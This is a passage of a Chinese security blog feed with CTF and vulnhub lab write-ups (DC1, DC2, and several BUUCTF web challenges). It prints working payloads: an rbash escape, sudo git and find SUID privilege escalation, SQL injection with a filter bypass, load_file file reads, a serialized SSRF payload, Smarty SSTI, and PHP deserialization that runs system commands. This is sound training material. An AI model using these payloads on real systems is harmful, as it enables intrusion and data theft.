输入set shell=/bin/bash回车</span><br><span class="line">shift+;  输入shell</span><br><span class="line">输入export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//方法2</span><br><span class="line">BASH_CMDS[A]=/bin/sh;A //进入sh环境</span><br><span class="line">/bin/bash  //来到bash环境</span><br><span class="line">export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409213553364.png" alt="image-20230409213553364"></p><p>成功绕过</p><p><strong>然后我们su jerry ，来到jerry用户，cd来到默认目录就可以看到flag4.txt</strong></p><p><img src="../images/image-20230409213728621.png" alt="image-20230409213728621"></p><p>看到flag4.txt的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">很高兴看到你已经走到这一步 - 但你还没有到家。</span><br><span class="line"></span><br><span class="line">您仍然需要获得最终标志（唯一真正重要的标志！！！）。</span><br><span class="line"></span><br><span class="line">这里没有提示 - 你现在靠自己了。 :-)</span><br><span class="line"></span><br><span class="line">继续 - 离开这里！！！！</span><br></pre></td></tr></table></figure><p>猜测就是提权了</p><p>因为这里并不是root用户</p><p>还是用find命令尝试一下(suid)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409214009428.png" alt="image-20230409214009428"></p><p>有个sudo可以用  那么就猜测这里是用sudo提权</p><p>那么就、<code>sudo -l</code>一下,看谁有root权限</p><p><img src="../images/image-20230409214118195.png" alt="image-20230409214118195"></p><p>发现是git，还没有密码限制</p><p><img src="../images/image-20230409214149805.png" alt="image-20230409214149805"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line"></span><br><span class="line">然后直接输入!/bin/bash</span><br><span class="line"></span><br><span class="line">然后我们就是root了，在然后就是获得flag了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409214323234.png" alt="image-20230409214323234"></p><p>然后就是root用户了</p><p>接下来直接读取flag就行了</p><p><img src="../images/image-20230409214511930.png" alt="image-20230409214511930"><strong>wpscan这个工具感觉是为了wordpress而准备的</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;总结:cewl和wpscan的使用，rbash逃逸，suid&lt;a href=&quot;https://so.csdn.net/so/search?q=提权&amp;amp;spm=1001.2101.3001.7020&quot;&gt;提权&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;cew</summary>
      
    
    
    
    
    <category term="vulnhub DC2" scheme="https://ke1nys.github.io/tags/vulnhub-DC2/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC1</title>
    <link href="https://ke1nys.github.io/posts/bd435367.html"/>
    <id>https://ke1nys.github.io/posts/bd435367.html</id>
    <published>2023-04-09T10:10:13.000Z</published>
    <updated>2023-04-09T11:15:48.280Z</updated>
    
    <content type="html"><![CDATA[<p>先扫一下c段，看一下哪个才是靶机</p><p><img src="../images/image-20230409181402738.png" alt="image-20230409181402738"></p><p>然后就随便猜一个，（或者关掉靶机，在重新扫一遍看哪个没了哪个就是靶机）</p><p>这里的话128是靶机</p><p>接下来就是扫端口了</p><p><img src="../images/image-20230409181552407.png" alt="image-20230409181552407"></p><p>扫到了三个端口</p><p>80端口一看就是个网站，那么我们尝试一下看能不能直接无密码(或者弱密码)登录ssh</p><p><img src="../images/image-20230409181755763.png" alt="image-20230409181755763"></p><p>尝试失败，那么我们就尝试一下去查看一下80端口</p><p><img src="../images/image-20230409181842624.png" alt="image-20230409181842624"></p><p>发现是一个cms框架，版本是7.x，那么我们就可以去查看一下有没有这个框架的exp能直接来打</p><p><strong>在msf中搜索一下</strong></p><p><img src="../images/image-20230409182322318.png" alt="image-20230409182322318"></p><p>发现有这个框架的exp  和aux(这个是判断是否存在漏洞)</p><p>那我们就直接使用直接使用这个exp来打这个网站了，用的是第二个</p><p><img src="../images/image-20230409183330747.png" alt="image-20230409183330747"></p><p>设置靶机地址</p><p><strong>set rhosts xxxxxxxxxx</strong></p><p><img src="../images/image-20230409183407891.png" alt="image-20230409183407891"></p><p>设置成功   (后面是yes的，前面的内容必须得写上)</p><p><img src="../images/image-20230409183548884.png" alt="image-20230409183548884"></p><p>反弹shell成功  拿到了<strong>meterpreter</strong></p><p><img src="../images/image-20230409183643295.png" alt="image-20230409183643295"></p><p>读取flag1的时候给了一段话     就是config配置文件</p><p><img src="../images/image-20230409183738020.png" alt="image-20230409183738020"></p><p>访问配置文件拿到关键数据</p><p><img src="../images/image-20230409183955691.png" alt="image-20230409183955691"></p><p><img src="../images/image-20230409183912269.png" alt="image-20230409183912269"></p><p>这里数据库登录报错，就不登陆了，直接进行提权拿最终的flag就行</p><p><img src="../images/image-20230409190252841.png" alt="image-20230409190252841"></p><p>这里的话先尝试一下suid   这里话在htb里面做过，这里就不多说了</p><p>这里如果按顺序拿flag的话会提示用suid</p><p>这里话弄个交互shell好进行查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>\;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409190621996.png" alt="image-20230409190621996"></p><p><img src="../images/image-20230409190655243.png" alt="image-20230409190655243"></p><p>提权的话可以直接拿到最终的flag</p><p>于是就是进行suid提权</p><p>先查找一下谁具有s权限</p><p><img src="../images/image-20230409190830425.png" alt="image-20230409190830425"></p><p>找到了个find命令可以使用</p><p>于是进行find提权</p><p><img src="../images/image-20230409191336590.png" alt="image-20230409191336590"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./ -exec &quot;/bin/sh&quot; \;</span><br><span class="line">find  在哪执行 -exec &quot;代码执行&quot; \</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先扫一下c段，看一下哪个才是靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230409181402738.png&quot; alt=&quot;image-20230409181402738&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后就随便猜一个，（或者关掉靶机，在重新扫一遍看哪个</summary>
      
    
    
    
    
    <category term="vulnhub DC1" scheme="https://ke1nys.github.io/tags/vulnhub-DC1/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-刷题记录 第二页</title>
    <link href="https://ke1nys.github.io/posts/6446e84f.html"/>
    <id>https://ke1nys.github.io/posts/6446e84f.html</id>
    <published>2023-04-06T06:49:17.000Z</published>
    <updated>2023-04-11T11:51:39.844Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>题目</p><p><img src="../images/image-20230406145253672.png" alt="image-20230406145253672"></p><p>访问robots.txt得到下面内容</p><p><img src="../images/image-20230406145322985.png" alt="image-20230406145322985"></p><p>访问下载下来得到一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406145503826.png" alt="image-20230406145503826"></p><p>这里存在一个ssrf</p><p>就是curl_exec使用不当会导致ssrf，然后我们回到首页，注册一个账号，然后点进去后，发现有一个类似sql注入的东西</p><p><img src="../images/image-20230406145655942.png" alt="image-20230406145655942"></p><p>然后就怀疑这里会不会存在sql注入</p><p>于是尝试手工注入：</p><p>?no = 1 and 1=1　　//回显正常</p><p>?no = 1 and 1=2　　//错误回显</p><p>铁定数字型注入，于是我们看看表中有多少列，确定一下列数，</p><p>?no = 1 order by 3　　　　//正常</p><p>?no = 1 order by 4　　　　//正常</p><p>?no = 1 order by 5　　　　//错误</p><p>所以确定列数，有4列</p><p>于是我们尝试union联合注入：</p><p>?no = -1 union select 1,2,3,4—+</p><p><a href="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208171409279-1904431169.png"><img src="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208171409279-1904431169.png" alt="img"></a></p><p> 结果有这么一段话，被发现了。</p><p>然后，通过大佬wp中发现，过滤了union select     (这里过滤的不是单个，而是整个进行了过滤)所以可以用下面的方式进行绕过</p><p>可以用过union/**/select绕过</p><p>于是我们再次构造payload:</p><p>?no = -1 union/**/select 1,2,3,4—+</p><p><img src="../images/image-20230406150007353.png" alt="image-20230406150007353"></p><p> 回显位是username,然后还发现了一下错误信息，/var/www/html/view.php刚才扫目录得知flag.php也在这个目录中。</p><p>然后我们开始查数据库和数据库信息</p><p>?no=-1 union/**/select 1,database(),3,4—+　　//数据库名</p><p><img src="../images/image-20230406150253089.png" alt="image-20230406150253089"></p><p>?no=-1 union/**/select 1,user(),3,4—+　　　　//数据库信息</p><p><img src="../images/image-20230406150330888.png" alt="image-20230406150330888"></p><p>是root用户</p><p>发现居然是root权限，那我们知道有一个load_file()函数可以利用绝对路径去加载一个文件，于是我们利用一下</p><p>load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件</p><p>?no=-1 union/**/select 1,load_file(“/var/www/html/flag.php”),3,4—+</p><p><img src="../images/image-20230406150538443.png" alt="image-20230406150538443"></p><p>这是非预期解</p><p>接下来是预期解</p><p>爆数据库表</p><p>?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()—+</p><p><img src="../images/image-20230406150702385.png" alt="image-20230406150702385"></p><p> 获得一张users表</p><p>然后爆字段名：</p><p>?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’users’—+</p><p><img src="../images/image-20230406150734818.png" alt="image-20230406150734818"></p><p> 这里面no，username,password我们都知道是什么，就data有点猫腻，于是我们查看它一下，于是我们爆data内容：</p><p>?no=-1 union/<strong>/select/</strong>/1,group_concat(no,’~’,username,’~’,passwd,’~’,data),3,4/<strong>/from/</strong>/fakebook.users</p><p><img src="../images/image-20230406150941192.png" alt="image-20230406150941192"></p><p>是一个序列化后的值，然后结合我们上面获得到的源码来进行分析</p><p>就是可以控制博客的值来进行ssrf</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>根据之前的注入可知，有回显的是第二位，也就是<code>username</code>字段，<code>data</code>对应应该就是第四个字段为，将反序列化字符串尝试以注入的方式写入</p><p><img src="../images/image-20230406151427472.png" alt="image-20230406151427472"></p><p>对下面的东西进行base64编码就行了</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><a href="https://blog.csdn.net/qq_42812036/article/details/104280196">这篇文章讲了源码泄露的例子</a></p><p>题目</p><p><img src="../images/image-20230406151807004.png" alt="image-20230406151807004"></p><p>登录框是弱密码</p><p><strong>admin/admin888</strong></p><p><img src="../images/image-20230406152326149.png" alt="image-20230406152326149"></p><p>发现没啥东西，然后点击下面的help的话，就会出现这个东西</p><p><img src="../images/image-20230406152427782.png" alt="image-20230406152427782"></p><p>并且它的url也很有意思，貌似可以下载文件</p><p>发现get不行</p><p>试试post</p><p><img src="../images/image-20230406152628037.png" alt="image-20230406152628037"></p><p>可进行文件的下载</p><p><img src="../images/image-20230406152653573.png" alt="image-20230406152653573"></p><p>打开后啥也没有，尝试去看看会不会存在源码泄露</p><p><img src="../images/image-20230406152737617.png" alt="image-20230406152737617"></p><p>存在源码泄露</p><p><img src="../images/image-20230406152823449.png" alt="image-20230406152823449"></p><p>这像是文件存放的路径</p><p>读取<code>FlagController.class</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>这个路径的话写过java的就能懂了</p><p><img src="../images/image-20230406153211962.png" alt="image-20230406153211962"></p><p>下载文件后就可以拿到flag了</p><p><img src="../images/image-20230406153311897.png" alt="image-20230406153311897"></p><p>把文件内的编码进行base64解码就行了</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>题目</p><p><img src="../images/image-20230406153757995.png" alt="image-20230406153757995"></p><p>打开界面，转到flag下面，发现展示我IP的一个界面，看到这个就突然想到了 X-Forwarded-For  </p><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。说白了就是检测外来接入的IP地址的东西，之前做题目的时候经常会遇到限制只能用默写特定的ip访问的题目，抓包之后改他就对了。</p><p>进入环境，发现还是那个熟悉的页面，hint里给我们提示了ip，在flag.php那里尝试xff头，发现成功回显，说明回显的点在xff头那里。猜测是SSTI。</p><p><img src="../images/image-20230406155110102.png" alt="image-20230406155110102"></p><p>确实是成功修改了</p><p><img src="../images/image-20230406155146646.png" alt="image-20230406155146646"></p><p>返回了49，说明不是jinja2的ssti</p><p><img src="../images/image-20230406155308230.png" alt="image-20230406155308230"></p><p>所以就通过判断来确定是上面的哪种类型</p><p><img src="../images/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATDFhbTB1cg==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>就是通过这张图来判断ssti的类型</p><p><img src="../images/image-20230406192122449.png" alt="image-20230406192122449"></p><p>由此来判断是smarty的ssti模板注入</p><p><a href="https://www.freebuf.com/column/219913.html">smarty  ssti</a></p><p>知道了之后就直接写payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">&#123;<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>能使用通配符</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>题目</p><p><img src="../images/image-20230406193358450.png" alt="image-20230406193358450"></p><p>这里给了个date()函数，然后下面就出现个时间，但还是不知道有什么用</p><p>抓个包</p><p><img src="../images/image-20230406193537404.png" alt="image-20230406193537404"></p><p>看到了这个东西,就猜测是func是函数，p是内容</p><p>那么我们就进行测试一下</p><p><img src="../images/image-20230406193705019.png" alt="image-20230406193705019"></p><p>抓取到了源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">     <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的话提供的这个类才是重点，不会进行过滤，可以直接用自己想用的函数</p><p>然后进行序列化，然后在用反序列化函数将命令进行执行</p><p>序列化代码(序列化之后注意将空格修改为+号，或者采用get方式进行传输）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>然后使用反序列化函数进行反序列化</p><p><img src="../images/image-20230406194638777.png" alt="image-20230406194638777"></p><p>完成绕过</p><p>还有一种解法</p><p><img src="../images/image-20230406194840536.png" alt="image-20230406194840536"></p><p><strong>\system可以绕过黑名单的原因：php内的” \ “在做代码执行的时候，会识别特殊字符串。</strong></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 